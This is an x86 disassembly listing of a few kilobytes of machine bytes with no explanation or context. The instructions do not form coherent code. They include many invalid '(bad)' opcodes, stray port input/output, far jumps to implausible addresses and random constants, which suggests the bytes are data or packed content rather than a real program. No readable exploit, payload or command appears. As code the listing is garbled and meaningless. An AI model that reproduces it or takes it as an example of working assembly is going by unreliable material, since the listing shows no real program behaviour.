  4068c5:	mov    dl,0xe7
  4068c7:	mov    ds:0xfcc6d15b,al
  4068cc:	mov    bl,dl
  4068ce:	jg     0x406886
  4068d0:	scas   eax,DWORD PTR es:[edi]
  4068d1:	lods   al,BYTE PTR ds:[esi]
  4068d2:	es ds jae 0x406867
  4068d6:	loope  0x406877
  4068d8:	loope  0x40688f
  4068da:	repz pop es
  4068dc:	or     DWORD PTR [ecx+ebx*2-0x9],edi
  4068e0:	test   eax,0xcb055dc0
  4068e5:	xchg   esi,eax
  4068e6:	sbb    eax,DWORD PTR [ebx-0x7ebeec12]
  4068ec:	sub    BYTE PTR [ecx+esi*2+0x7695e2f7],0xf
  4068f4:	(bad)  
  4068f5:	(bad)  
  4068f6:	js     0x4068a6
  4068f8:	lahf   
  4068f9:	sub    eax,0xe47a75c7
  4068fe:	js     0x4068e4
  406900:	push   edx
  406901:	imul   edx,DWORD PTR [eax+0x1d89b629],0x25
  406908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406909:	jo     0x406899
  40690b:	dec    eax
  40690c:	(bad)  
  40690d:	mov    ebx,0x9dc964c1
  406912:	and    DWORD PTR [edi],ebx
  406914:	pop    edi
  406915:	repnz retf 
  406917:	addr16 mov bl,0xfd
  40691a:	sbb    bl,dh
  40691c:	and    eax,0x5eb0281e
  406921:	retf   0xd0c3
  406924:	ds add al,0x7e
  406927:	sbb    edi,edx
  406929:	fsub   DWORD PTR [ebx]
  40692b:	arpl   WORD PTR [edi-0x56],di
  40692e:	and    DWORD PTR [eax+0x12],ecx
  406931:	pop    edx
  406932:	sbb    BYTE PTR [eax],bl
  406934:	or     ah,cl
  406936:	scas   eax,DWORD PTR es:[edi]
  406937:	sub    edx,DWORD PTR ds:0x954d2a5d
  40693d:	pop    edi
  40693e:	in     al,0x20
  406940:	ficomp WORD PTR [ebp+0x68]
  406943:	pop    ecx
  406944:	push   ecx
  406945:	and    ecx,DWORD PTR [esi+0x66]
  406948:	loop   0x4069b7
  40694a:	retf   0x9810
  40694d:	cmp    al,0xd3
  40694f:	dec    esi
  406950:	jbe    0x406965
  406952:	mov    bl,BYTE PTR [edi]
  406954:	sub    DWORD PTR [edx-0x763c4c53],edi
  40695a:	div    BYTE PTR [esi]
  40695c:	xor    edi,DWORD PTR [ecx-0x58777c46]
  406962:	rcl    DWORD PTR [esi+0x75],1
  406965:	dec    ebx
  406966:	sbb    ah,BYTE PTR [ecx]
  406968:	fdivr  DWORD PTR [eax]
  40696a:	adc    al,0x39
  40696c:	inc    ebx
  40696d:	les    edi,FWORD PTR [ebx-0x6d]
  406970:	es pop ebp
  406972:	dec    eax
  406973:	and    dh,BYTE PTR [ecx-0x78]
  406976:	mov    ebx,0x814f01d
  40697b:	push   0xffffffbb
  40697d:	xchg   DWORD PTR [edx-0x22640839],ecx
  406983:	cmp    ebp,eax
  406985:	and    BYTE PTR [edi],al
  406987:	pop    esi
  406988:	das    
  406989:	mov    al,0x7f
  40698b:	sbb    eax,0x7c4f2267
  406990:	xor    ch,BYTE PTR [edx]
  406992:	inc    esi
  406993:	jp     0x406a08
  406995:	jns    0x406986
  406997:	jl     0x40691d
  406999:	int3   
  40699a:	sub    ecx,edi
  40699c:	in     al,0x14
  40699e:	sub    al,0xad
  4069a0:	jmp    0xefe5:0xd90a599f
  4069a7:	out    0x73,eax
  4069a9:	push   edi
  4069aa:	inc    esp
  4069ab:	(bad)  
  4069ad:	pusha  
  4069ae:	sbb    eax,0x729849fc
  4069b3:	mov    ?,WORD PTR [eax+0x36cd224f]
  4069b9:	ss jmp 0x406a03
  4069bc:	cli    
  4069bd:	add    eax,DWORD PTR [edx+0x15]
  4069c0:	add    BYTE PTR [edx-0x6063837a],0xa7
  4069c7:	dec    esi
  4069c8:	inc    esi
  4069c9:	lock mov bl,0xf0
  4069cc:	call   0x39764638
  4069d1:	ror    BYTE PTR [eax],0x61
  4069d4:	cmp    al,0x2a
  4069d6:	in     eax,dx
  4069d7:	pop    eax
  4069d8:	fadd   DWORD PTR [edx-0x5e]
  4069db:	retf   
  4069dc:	repz push edi
  4069de:	loope  0x4069b6
  4069e0:	leave  
  4069e1:	stos   DWORD PTR es:[edi],eax
  4069e2:	add    BYTE PTR [esi],0x86
  4069e5:	enter  0xda91,0x7f
  4069e9:	adc    ebx,DWORD PTR [eax+0x1bf39dc2]
  4069ef:	mov    ds:0x38bb2769,al
  4069f4:	mov    eax,0x3792761
  4069f9:	mov    dh,0xbd
  4069fb:	push   ss
  4069fc:	push   eax
  4069fd:	iret   
  4069fe:	xchg   edx,eax
  4069ff:	sti    
  406a00:	inc    edi
  406a01:	mov    DWORD PTR [ebx-0x4a783e45],esp
  406a07:	mov    ds,WORD PTR [ebx+eax*8]
  406a0a:	xlat   BYTE PTR ds:[ebx]
  406a0b:	mov    eax,ds:0x62f2f441
  406a10:	pop    edi
  406a11:	push   ds
  406a12:	and    esi,ebp
  406a14:	mov    bl,0xe5
  406a16:	push   esp
  406a17:	mov    edi,edx
  406a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a1a:	test   eax,0x896320a
  406a1f:	sub    ebx,DWORD PTR [esi-0x601627ae]
  406a25:	cld    
  406a26:	mov    ecx,0x623b8f51
  406a2b:	add    eax,DWORD PTR [esi+0x13]
  406a2e:	mov    ds:0x9a6b11f3,al
  406a33:	mov    esp,ebx
  406a35:	fadd   DWORD PTR ds:0x23551a23
  406a3b:	aam    0xd4
  406a3d:	js     0x406a42
  406a3f:	ficomp DWORD PTR [ebp-0x168c5ba1]
  406a45:	push   cs
  406a46:	ror    DWORD PTR [ecx+0x36],cl
  406a49:	adc    DWORD PTR [esi+0x6b],ecx
  406a4c:	mov    dh,0x5d
  406a4e:	inc    esi
  406a4f:	mov    esp,0xe92efed6
  406a54:	aam    0x77
  406a56:	dec    esp
  406a57:	lock loope 0x406a31
  406a5a:	callw  0x8dd3
  406a5e:	sub    ch,cl
  406a60:	jge    0x406a2d
  406a62:	adc    al,BYTE PTR [esi+0x5ff79a54]
  406a68:	(bad)  
  406a69:	into   
  406a6a:	sub    cl,bl
  406a6c:	sub    dh,BYTE PTR [eax]
  406a6e:	enter  0x3dd9,0xc
  406a72:	inc    eax
  406a73:	fdivr  QWORD PTR [ebx+edx*8+0x7c]
  406a77:	or     BYTE PTR [ebp-0x69d0cb6e],bh
  406a7d:	inc    edx
  406a7e:	cli    
  406a7f:	lods   eax,DWORD PTR ds:[esi]
  406a80:	sti    
  406a81:	push   es
  406a82:	mov    eax,ds:0xdf6ebd51
  406a87:	imul   ecx,DWORD PTR [esp+ebx*4-0x77],0x86a7cc69
  406a8f:	xchg   esp,eax
  406a90:	test   ebx,edx
  406a92:	adc    BYTE PTR [ebp+eax*1+0x6a],cl
  406a96:	mov    eax,DWORD PTR [edx+0x62c9c908]
  406a9c:	fcomp  DWORD PTR [edx]
  406a9e:	pop    es
  406a9f:	or     DWORD PTR [eax+ebp*2-0x55],esi
  406aa3:	push   eax
  406aa4:	xchg   ebx,eax
  406aa5:	stos   BYTE PTR es:[edi],al
  406aa6:	xchg   edi,eax
  406aa7:	lea    ebx,[ebp-0x29]
  406aaa:	add    edx,edx
  406aac:	pop    ds
  406aad:	mov    ebx,0x9f8977ca
  406ab2:	mov    al,ds:0xad404c80
  406ab7:	push   0x297a3587
  406abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406abd:	xchg   ebx,eax
  406abe:	ss dec eax
  406ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ac1:	push   ds
  406ac2:	push   0x9f903c80
  406ac7:	or     ah,dh
  406ac9:	add    dl,bl
  406acb:	and    edi,DWORD PTR [ebx+0xb]
  406ace:	adc    edi,DWORD PTR [ebp+0x4a]
  406ad1:	ds push ss
  406ad3:	jecxz  0x406b23
  406ad5:	xchg   ebp,eax
  406ad6:	rcr    BYTE PTR ds:0x38eda3d7,0x72
  406add:	frstor [ebp+0x21]
  406ae0:	jle    0x406b0e
  406ae2:	scas   eax,DWORD PTR es:[edi]
  406ae3:	inc    edi
  406ae4:	shr    BYTE PTR [edi+edx*4],cl
  406ae7:	and    ebx,DWORD PTR [ecx+edx*4]
  406aea:	cmp    al,0xcb
  406aec:	dec    ebp
  406aed:	sbb    DWORD PTR [edi],esp
  406aef:	and    eax,esi
  406af1:	dec    edi
  406af2:	add    DWORD PTR [ebx-0x137fb0a0],ecx
  406af8:	sub    bh,dh
  406afa:	push   esi
  406afb:	jl     0x406afe
  406afd:	(bad)  
  406afe:	cmp    al,0x63
  406b00:	dec    ebp
  406b01:	loopne 0x406b12
  406b03:	jge    0x406b46
  406b05:	mov    DWORD PTR [ecx],0x2c7003b0
  406b0b:	int    0x61
  406b0d:	xchg   esp,eax
  406b0e:	ja     0x406a98
  406b10:	or     DWORD PTR [eax],ebp
  406b12:	mov    bl,0xf2
  406b14:	mov    ecx,0x7ee9738c
  406b19:	(bad)  
  406b1a:	bound  ebx,QWORD PTR [ecx+0x5f339884]
  406b20:	std    
  406b21:	and    DWORD PTR [edx+esi*4],0xd43e59fd
  406b28:	xor    ah,BYTE PTR [ecx+ebp*8]
  406b2b:	jo     0x406b24
  406b2d:	ror    BYTE PTR [esi],0x79
  406b30:	and    edx,edx
  406b32:	inc    ebp
  406b33:	cmp    eax,0xa9e10dc
  406b38:	sbb    eax,0x2a8468b9
  406b3d:	mov    ds:0xb79e671,eax
  406b42:	pmaxsw mm3,QWORD PTR [ebp+0x4d]
  406b46:	adc    DWORD PTR [ecx+0x1d22d4b9],esp
  406b4c:	std    
  406b4d:	xor    al,0xca
  406b4f:	clc    
  406b50:	push   ecx
  406b51:	push   ds
  406b52:	push   ebx
  406b53:	inc    esp
  406b54:	mov    esi,0x6a8b70
  406b59:	xor    dl,BYTE PTR [ebx+0x45]
  406b5c:	out    0xe0,al
  406b5e:	adc    cl,al
  406b60:	cmp    BYTE PTR [ecx],al
  406b62:	dec    esi
  406b63:	ja     0x406b26
  406b65:	pop    ecx
  406b66:	mov    ebp,0x5c8a5e82
  406b6b:	cmp    edx,DWORD PTR ds:[eax-0x5524e8b0]
  406b72:	out    dx,eax
  406b73:	jno    0x406bd8
  406b75:	xchg   BYTE PTR [ebx-0x6],cl
  406b78:	in     eax,0xf2
  406b7a:	cmp    ch,BYTE PTR [edi+0x2bc49ce1]
  406b80:	cs jne 0x406bd9
  406b83:	add    edi,DWORD PTR [esi+0x6e]
  406b86:	sbb    ah,bh
  406b88:	mov    ebp,0xaaf5e2c2
  406b8d:	xor    cl,BYTE PTR [esi-0x5b2f915a]
  406b93:	pop    ds
  406b94:	dec    ecx
  406b95:	cmp    cl,BYTE PTR [ebp+0x67]
  406b98:	loop   0x406be3
  406b9a:	cld    
  406b9b:	fwait
  406b9c:	(bad)  
  406b9d:	sahf   
  406b9e:	xchg   esi,eax
  406b9f:	ins    BYTE PTR es:[edi],dx
  406ba0:	and    al,0x37
  406ba2:	fsubr  st(0),st
  406ba4:	jecxz  0x406be8
  406ba6:	xlat   BYTE PTR ds:[ebx]
  406ba7:	retf   0x7875
  406baa:	and    BYTE PTR [eax-0x61],ah
  406bad:	out    dx,al
  406bae:	cmp    al,0x40
  406bb0:	lock std 
  406bb2:	inc    eax
  406bb3:	in     eax,0x57
  406bb5:	push   edi
  406bb6:	inc    esi
  406bb7:	in     eax,dx
  406bb8:	clc    
  406bb9:	out    dx,eax
  406bba:	mov    ebx,0xbb175be1
  406bbf:	or     eax,0x9ba5a67a
  406bc4:	lods   eax,DWORD PTR ds:[esi]
  406bc5:	dec    edx
  406bc6:	xchg   ebx,ebx
  406bc8:	push   ss
  406bc9:	into   
  406bca:	fsub   DWORD PTR [esi-0xbe2382d]
  406bd0:	pop    ebp
  406bd2:	push   edi
  406bd3:	adc    DWORD PTR [ebx*1-0x6f47f199],eax
  406bda:	aam    0x1f
  406bdc:	enter  0x3404,0x6b
  406be0:	mov    ebx,0xbaecd845
  406be5:	scas   eax,DWORD PTR es:[edi]
  406be6:	loop   0x406c60
  406be8:	ins    DWORD PTR es:[edi],dx
  406be9:	jle    0x406c2a
  406beb:	cli    
  406bec:	fwait
  406bed:	mov    ebp,DWORD PTR [ebx+0xd]
  406bf0:	out    0xd1,al
  406bf2:	mov    bl,0x8e
  406bf4:	ficom  WORD PTR [edi]
  406bf6:	cmp    DWORD PTR [eax+edx*2-0x5],edx
  406bfa:	aas    
  406bfb:	pop    ds
  406bfc:	sub    esi,DWORD PTR [ebx+0x78]
  406bff:	push   esp
  406c00:	xor    DWORD PTR [eax+0x6c0c47fa],ecx
  406c06:	push   eax
  406c07:	in     eax,dx
  406c08:	and    DWORD PTR [esi],edx
  406c0a:	adc    BYTE PTR [bx+si+0x15],dh
  406c0e:	push   ds
  406c0f:	push   edx
  406c10:	push   eax
  406c11:	fcomp  st(1)
  406c13:	add    DWORD PTR ds:0x42d41fd3,eax
  406c19:	ja     0x406c8c
  406c1b:	scas   al,BYTE PTR es:[edi]
  406c1c:	mov    ecx,0xb8ea5c79
  406c21:	jg     0x406c88
  406c23:	adc    ebp,DWORD PTR [ebx]
  406c25:	inc    eax
  406c26:	cmp    DWORD PTR [ebx+0x447c16ae],ebp
  406c2c:	iret   
  406c2d:	cmp    eax,0x4a898cba
  406c32:	clc    
  406c33:	ret    0x10f8
  406c36:	gs (bad) 
  406c38:	mov    eax,DWORD PTR [ebp+ebx*1+0x65d1385d]
  406c3f:	sbb    al,0x6b
  406c41:	mov    ebx,0x9ae25f87
  406c46:	mov    esi,0x12be3e38
  406c4b:	sbb    esp,edx
  406c4d:	mov    cl,ch
  406c4f:	imul   ecx,DWORD PTR [ebx],0x1f
  406c52:	sti    
  406c53:	aad    0xb6
  406c55:	add    DWORD PTR [ebp-0x963ec90],edi
  406c5b:	mov    cl,0x1e
  406c5d:	std    
  406c5e:	push   esp
  406c5f:	aaa    
  406c60:	sbb    esp,ebp
  406c62:	hlt    
  406c63:	(bad)  
  406c64:	or     BYTE PTR [ebx+0x205c03be],ah
  406c6a:	mov    dl,0xcb
  406c6c:	mov    bh,0x8b
  406c6e:	pop    esi
  406c6f:	push   edx
  406c70:	daa    
  406c71:	fnclex 
  406c73:	push   edi
  406c74:	test   BYTE PTR [esi],bh
  406c76:	or     eax,0xee964810
  406c7b:	sub    al,0x51
  406c7d:	ins    DWORD PTR es:[edi],dx
  406c7e:	jp     0x406c20
  406c80:	fimul  DWORD PTR [esi]
  406c82:	adc    eax,0xdd9a21ec
  406c87:	ret    0x5f90
  406c8a:	lods   eax,DWORD PTR ds:[esi]
  406c8b:	test   eax,esp
  406c8d:	sub    BYTE PTR [edx-0x24644028],bl
  406c93:	dec    edx
  406c94:	inc    esi
  406c95:	cdq    
  406c96:	cli    
  406c97:	repnz or al,0x9c
  406c9a:	fs mov ebx,0x3020a0f1
  406ca0:	jecxz  0x406ca9
  406ca2:	lahf   
  406ca3:	aas    
  406ca4:	(bad)  
  406ca5:	adc    al,0xd1
  406ca7:	jno    0x406c94
  406ca9:	xor    edx,edi
  406cab:	sbb    esp,esp
  406cad:	sbb    BYTE PTR [ecx],al
  406caf:	pop    edx
  406cb0:	push   edx
  406cb1:	pop    eax
  406cb2:	mov    edx,eax
  406cb4:	inc    edx
  406cb5:	adc    al,BYTE PTR [edi-0x5a]
  406cb8:	inc    esp
  406cb9:	or     dl,ah
  406cbb:	push   ecx
  406cbc:	cmp    eax,0xe8889050
  406cc1:	adc    bl,BYTE PTR [ecx-0x181d3b61]
  406cc7:	xchg   DWORD PTR [esp+ecx*2+0x32],edx
  406ccb:	bound  esi,QWORD PTR [edi]
  406ccd:	(bad)  
  406cce:	or     BYTE PTR [edx+0x25],dh
  406cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd2:	inc    esp
  406cd3:	adc    ah,BYTE PTR [ecx]
  406cd5:	rcl    ah,cl
  406cd7:	scas   al,BYTE PTR es:[edi]
  406cd8:	fdivr  DWORD PTR gs:[ecx+0x3f]
  406cdc:	pop    esi
  406cdd:	jge    0x406c6a
  406cdf:	test   BYTE PTR [ebx],bl
  406ce1:	les    edx,FWORD PTR [edi+0x7204c393]
  406ce7:	fcom   DWORD PTR [ecx-0x4b933ff8]
  406ced:	sub    bl,bh
  406cef:	or     al,0x17
  406cf1:	jno    0x406c94
  406cf3:	repz out 0x34,al
  406cf6:	inc    eax
  406cf7:	aaa    
  406cf8:	fnstsw WORD PTR [ecx]
  406cfa:	das    
  406cfb:	dec    esp
  406cfc:	xor    BYTE PTR [edi-0x2c0b8f83],dl
  406d02:	lods   eax,DWORD PTR ds:[esi]
  406d03:	push   ss
  406d04:	mov    edx,0xb9e82618
  406d09:	jno    0x406d3a
  406d0b:	sub    edi,DWORD PTR [eax-0x42]
  406d0e:	inc    esi
  406d0f:	repz and ecx,DWORD PTR [eax+0xa1e6485]
  406d16:	fisubr WORD PTR ds:0x33fdcc2
  406d1c:	jmp    0x9c4c9007
  406d21:	add    eax,0xafa35c7d
  406d26:	pop    DWORD PTR [eax-0x62166ac8]
  406d2c:	add    al,0x37
  406d2e:	les    edx,FWORD PTR [eax-0x4550d825]
  406d34:	arpl   di,si
  406d36:	add    DWORD PTR [ebx],ebp
  406d38:	inc    esi
  406d39:	add    ah,BYTE PTR [ecx+0x11]
  406d3c:	jne    0x406d2d
  406d3e:	push   edi
  406d3f:	cmp    dl,al
  406d41:	nop
  406d42:	inc    edx
  406d43:	fcom   QWORD PTR [eax-0x54]
  406d46:	data16 (bad) 
  406d49:	dec    ecx
  406d4a:	pop    eax
  406d4b:	xor    eax,0x6e89fc80
  406d50:	jmp    0x406d9d
  406d52:	jo     0x406d75
  406d54:	cmc    
  406d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d56:	enter  0x902a,0x52
  406d5a:	out    0x8b,al
  406d5c:	or     BYTE PTR [eax-0x45],dl
  406d5f:	lods   al,BYTE PTR ds:[esi]
  406d60:	(bad)  
  406d61:	test   DWORD PTR [edi-0x6a],0xa7f330f4
  406d68:	clc    
  406d69:	shl    bh,1
  406d6b:	repz dec edx
  406d6d:	fstp   QWORD PTR [esi+0x7b00e5fb]
  406d73:	mov    eax,ss
  406d75:	mov    dl,BYTE PTR ds:0x448129d4
  406d7b:	stos   DWORD PTR es:[edi],eax
  406d7c:	and    esi,DWORD PTR [esi+ecx*4-0x5c]
  406d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d81:	ficom  WORD PTR ds:0x5618ab2a
  406d87:	jbe    0x406db8
  406d89:	aam    0x0
  406d8b:	fstp   QWORD PTR [ecx+0xea8dd5a]
  406d91:	cld    
  406d92:	in     al,0x22
  406d94:	out    0x40,al
  406d96:	dec    edx
  406d97:	inc    edi
  406d98:	es sub eax,0xf70232d0
  406d9e:	mov    es,WORD PTR [eax-0x6b15c27e]
  406da4:	cs aas 
  406da6:	retf   0xe02c
  406da9:	gs jbe 0x406d51
  406dac:	dec    eax
  406dad:	inc    edi
  406dae:	pop    ecx
  406daf:	fcmovnbe st,st(0)
  406db1:	retf   0xd66b
  406db4:	push   ecx
  406db5:	jmp    0x406d46
  406db7:	nop
  406db8:	aad    0x19
  406dba:	ret    0x51be
  406dbd:	xor    eax,0xcbeb1a21
  406dc2:	cld    
  406dc3:	fadd   QWORD PTR [eax]
  406dc5:	inc    esi
  406dc6:	xacquire xchg DWORD PTR [esp+ebx*1-0x49b4e9f],eax
  406dce:	sub    eax,0xbc31c4c8
  406dd3:	or     eax,0x6a79766d
  406dd8:	sti    
  406dd9:	cmp    DWORD PTR [ebp-0xc],esi
  406ddc:	loope  0x406d80
  406dde:	push   ds
  406ddf:	(bad)  
  406de0:	not    edx
  406de2:	popf   
  406de3:	mov    edi,0xa19ef474
  406de8:	pop    ss
  406de9:	xor    al,0x2d
  406deb:	cmp    BYTE PTR [ebp-0x44],cl
  406dee:	dec    eax
  406def:	inc    ebp
  406df0:	jmp    0x43f09dfe
  406df5:	fisubr DWORD PTR [edx-0x44]
  406df8:	xchg   esp,eax
  406df9:	cs jae 0x406dc6
  406dfc:	xor    edx,edi
  406dfe:	mov    dh,0xc2
  406e00:	add    ecx,DWORD PTR [edi]
  406e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e03:	mov    DWORD PTR [eax],ebx
  406e05:	aaa    
  406e06:	jnp    0x406e58
  406e08:	jmp    0x3f4583db
  406e0d:	(bad)  
  406e0e:	mov    edx,0xb4c2547b
  406e13:	test   ah,bh
  406e15:	jne    0x406e0a
  406e17:	adc    eax,0xde40c0f4
  406e1c:	jl     0x406e4c
  406e1e:	mov    ecx,gs
  406e20:	data16 mov dh,0x38
  406e23:	and    eax,0xedd18241
  406e28:	jp     0x406dfc
  406e2a:	nop
  406e2b:	mov    eax,ds:0xbc75b740
  406e30:	ret    
  406e31:	popf   
  406e32:	loop   0x406e1b
  406e34:	push   0x2d
  406e36:	imul   edx,DWORD PTR [ebx+0x55ad2613],0x1d15a9fe
  406e40:	push   ds
  406e41:	add    al,0xcd
  406e43:	pop    ebx
  406e44:	push   edx
  406e45:	es mov dh,0xe4
  406e48:	(bad)  
  406e49:	pop    ss
  406e4a:	loopne 0x406e69
  406e4c:	imul   eax,DWORD PTR [ecx],0x3c
  406e4f:	push   ebx
  406e50:	push   ds
  406e51:	je     0x406e0e
  406e53:	cmc    
  406e54:	pop    eax
  406e55:	add    BYTE PTR [esi],ah
  406e57:	mov    BYTE PTR [eax],bh
  406e59:	sbb    esi,edx
  406e5b:	sbb    ch,bh
  406e5d:	push   edx
  406e5e:	in     eax,0xc0
  406e60:	push   esp
  406e61:	jp     0x406ec6
  406e63:	fisub  WORD PTR [edi+0x6e67a22]
  406e69:	das    
  406e6a:	in     eax,0xa2
  406e6c:	cld    
  406e6d:	popa   
  406e6e:	add    esi,DWORD PTR [edx-0x48592ba6]
  406e74:	jmp    0x83088c89
  406e79:	pop    es
  406e7a:	aam    0x47
  406e7c:	out    0x88,ax
  406e7f:	loop   0x406e46
  406e81:	fcomp  QWORD PTR [ebx+eax*2]
  406e84:	dec    DWORD PTR [edx-0xcc35d6]
  406e8a:	je     0x406ea5
  406e8c:	add    BYTE PTR [ecx+0x3dbee4e3],0x64
  406e93:	pop    eax
  406e94:	popf   
  406e95:	pop    ss
  406e96:	and    DWORD PTR [esi+eax*8],eax
  406e99:	mov    bl,0x59
  406e9b:	jmp    0x406e2a
  406e9d:	ss pop esi
  406e9f:	and    al,al
  406ea1:	std    
  406ea2:	xor    al,bl
  406ea4:	sti    
  406ea5:	sub    dh,BYTE PTR [ecx+0x18]
  406ea8:	sbb    esi,DWORD PTR [eax+eiz*2-0x13b00962]
  406eaf:	cmp    eax,0x91c6fa81
  406eb4:	in     al,dx
  406eb5:	jl     0x406e73
  406eb7:	adc    eax,0x6af938c1
  406ebc:	xor    al,0xb4
  406ebe:	and    al,0x2c
  406ec0:	shl    DWORD PTR [esp+ebx*8+0x78034b1a],1
  406ec7:	mov    bh,0x45
  406ec9:	sub    esp,DWORD PTR [esp+edi*1-0x45]
  406ecd:	and    eax,esp
  406ecf:	xchg   edx,eax
  406ed0:	mov    bl,0x78
  406ed2:	aad    0x22
  406ed4:	xlat   BYTE PTR ds:[ebx]
  406ed5:	sbb    DWORD PTR [ecx-0x47a41e0d],ecx
  406edb:	mov    ds,WORD PTR [edi+0x48]
  406ede:	leave  
  406edf:	sbb    al,cl
  406ee1:	xor    al,0x73
  406ee3:	cmp    DWORD PTR [ecx-0x480fd854],esp
  406ee9:	mov    cl,0xf1
  406eeb:	sub    eax,ebx
  406eed:	dec    ebx
  406eee:	test   eax,0x255b4ef
  406ef3:	xlat   BYTE PTR ds:[ebx]
  406ef4:	xor    eax,0x2fcb2cb
  406ef9:	xor    esi,DWORD PTR [edx-0x37]
  406efc:	push   esp
  406efd:	jne    0x406e8f
  406eff:	call   0x2aa26a5f
  406f04:	sbb    al,0x56
  406f06:	pushf  
  406f07:	mov    WORD PTR gs:[ebx],?
  406f0a:	and    bl,dl
  406f0c:	pop    ebx
  406f0d:	lea    ebx,[ebx-0x33]
  406f10:	sub    DWORD PTR [esi+0x2fa0d27b],ebx
  406f16:	jl     0x406eed
  406f18:	(bad)  
  406f19:	mov    ds:0x2d32542d,al
  406f1e:	scas   eax,DWORD PTR es:[edi]
  406f1f:	jmp    FWORD PTR [ebp+0x78840170]
  406f25:	gs dec esi
  406f27:	stos   BYTE PTR es:[edi],al
  406f28:	mov    ebx,0x17255bd1
  406f2d:	shl    DWORD PTR [esi-0x678abe76],1
  406f33:	mov    cl,0x79
  406f35:	jle    0x406f12
  406f37:	xchg   ecx,eax
  406f38:	cmp    BYTE PTR [esi],dl
  406f3a:	(bad)  
  406f3b:	pop    eax
  406f3c:	push   cs
  406f3d:	fild   DWORD PTR [ebp+ebx*1+0x2364ad79]
  406f44:	add    al,0x2a
  406f46:	pop    esp
  406f47:	mov    ah,0xfc
  406f49:	gs out 0xbd,al
  406f4c:	bt     ecx,esp
  406f4f:	push   edx
  406f50:	repnz scas eax,DWORD PTR es:[edi]
  406f52:	mov    ah,0xfb
  406f54:	mov    ds:0x1a50ea05,al
  406f59:	repnz mov WORD PTR [ebx-0x75],fs
  406f5d:	adc    eax,0xf644f90a
  406f62:	das    
  406f63:	mov    eax,0xd89dc88
  406f68:	in     eax,0xd6
  406f6a:	(bad)  
  406f6b:	sub    al,0x9b
  406f6d:	add    DWORD PTR [ecx],esi
  406f6f:	adc    DWORD PTR [edi],0xa
  406f72:	sti    
  406f73:	(bad)  
  406f74:	push   ebx
  406f75:	retf   0x8b77
  406f78:	adc    DWORD PTR [edi],ebp
  406f7a:	test   BYTE PTR [esi-0x40766b94],0xe
  406f81:	adc    BYTE PTR [edi-0x2210878d],0x1b
  406f88:	fcmovnu st,st(5)
  406f8a:	mov    edx,ebx
  406f8c:	mov    dh,0x76
  406f8e:	arpl   si,dx
  406f90:	push   edi
  406f91:	int3   
  406f92:	or     ecx,ecx
  406f94:	or     eax,eax
  406f96:	jecxz  0x406f51
  406f98:	adc    al,BYTE PTR [eax+0x15]
  406f9b:	popf   
  406f9c:	mov    cx,bp
  406f9f:	loop   0x406f60
  406fa1:	adc    bh,BYTE PTR [edx+0x11430e11]
  406fa7:	or     DWORD PTR [eax-0x73],ebp
  406faa:	in     al,0x77
  406fac:	aaa    
  406fad:	push   ds
  406fae:	pop    ebx
  406faf:	sbb    DWORD PTR [eax+eiz*2-0x3a],ebp
  406fb3:	int3   
  406fb4:	sub    BYTE PTR [eax+0x65],ah
  406fb7:	test   al,0x7e
  406fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fba:	int    0xb3
  406fbc:	gs push ebx
  406fbe:	xchg   esp,eax
  406fbf:	mov    BYTE PTR [edx],dh
  406fc1:	and    BYTE PTR [edx+0xd8ddc78],ch
  406fc7:	(bad)  
  406fc8:	fisubr WORD PTR [edi+0x7e795dd6]
  406fce:	pop    esi
  406fcf:	mov    cs:0x56bb2f93,al
  406fd5:	and    eax,0x5bf0959
  406fda:	stc    
  406fdb:	imul   edi,DWORD PTR [edi],0x59
  406fde:	cmp    ah,ch
  406fe0:	leave  
  406fe1:	enter  0xbdf8,0x4
  406fe5:	adc    edi,DWORD PTR [ebx]
  406fe7:	mov    eax,0x56da43f9
  406fec:	js     0x406f98
  406fee:	dec    eax
  406fef:	sub    esi,DWORD PTR [ecx-0x6b]
  406ff2:	lock lahf 
  406ff4:	add    DWORD PTR [edx+0x40653caa],esi
  406ffa:	popa   
  406ffb:	test   DWORD PTR [edi],0x28af7486
  407001:	pushf  
  407002:	adc    eax,0x25b9e0d6
  407007:	ja     0x40707a
  407009:	cmp    eax,0x619e788f
  40700e:	cwde   
  40700f:	mov    BYTE PTR ds:0x1d4e587,dh
  407015:	das    
  407016:	jl     0x406fe6
  407018:	adc    al,0x67
  40701a:	in     eax,dx
  40701b:	fmul   st,st(5)
  40701d:	add    eax,0x2b114967
  407022:	fild   DWORD PTR [esi]
  407024:	sub    bl,BYTE PTR [edi-0x1a46428b]
  40702a:	outs   dx,DWORD PTR ds:[esi]
  40702b:	fs xchg ecx,eax
  40702d:	pop    edx
  40702e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40702f:	mov    eax,ds:0x2da97b1e
  407034:	cmp    eax,0x13daef95
  407039:	ss out dx,al
  40703b:	ficom  DWORD PTR [ecx+0x72951364]
  407041:	dec    edx
  407042:	(bad)  
  407043:	sub    esi,edi
  407045:	push   edi
  407046:	pop    esi
  407047:	push   ecx
  407048:	push   ds
  407049:	out    0xca,al
  40704b:	add    BYTE PTR [edx-0x4c28fc02],cl
  407051:	jo     0x40700a
  407053:	push   ds
  407054:	fs popf 
  407056:	ds cmp ah,bl
  407059:	mov    edi,0xb1442716
  40705e:	mov    ds:0x611ad6ca,eax
  407063:	push   ds
  407064:	cmp    al,0x26
  407066:	js     0xe1dcb614
  40706c:	aas    
  40706d:	(bad)  
  40706e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407070:	push   es
  407071:	shl    BYTE PTR [eax-0x73],cl
  407074:	push   ebp
  407075:	push   si
  407077:	hlt    
  407078:	sub    al,0x82
  40707a:	or     al,0xb0
  40707c:	push   0x9d1ebabc
  407081:	mov    dh,0xa7
  407083:	mov    bl,0x3c
  407085:	mov    eax,0xd4a71a12
  40708b:	outs   dx,BYTE PTR ds:[esi]
  40708c:	xor    cl,BYTE PTR [esi+0x10317b52]
  407092:	test   al,0xd1
  407094:	dec    edi
  407095:	out    dx,eax
  407096:	stos   DWORD PTR es:[edi],eax
  407097:	test   al,0xb8
  407099:	popf   
  40709a:	inc    edx
